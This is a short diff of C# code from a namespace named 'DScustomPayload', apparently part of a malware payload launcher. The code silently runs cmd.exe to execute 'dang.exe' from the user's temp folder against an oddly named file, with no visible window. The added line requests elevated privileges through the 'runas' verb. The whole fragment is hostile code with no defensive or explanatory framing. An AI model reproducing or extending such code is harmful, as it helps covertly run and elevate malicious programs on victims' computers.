@@ -367,6 +367,7 @@ namespace DScustomPayload
 			processInfo = new ProcessStartInfo("cmd.exe", @"/c call %temp%\dang.exe %temp%\ptrgzksfeqfesgse.dang");
 			processInfo.CreateNoWindow = true;
 			processInfo.UseShellExecute = false;
+			processInfo.Verb = "runas";
 			processInfo.RedirectStandardOutput = true;
 			process = Process.Start(processInfo);
 			process.WaitForExit();
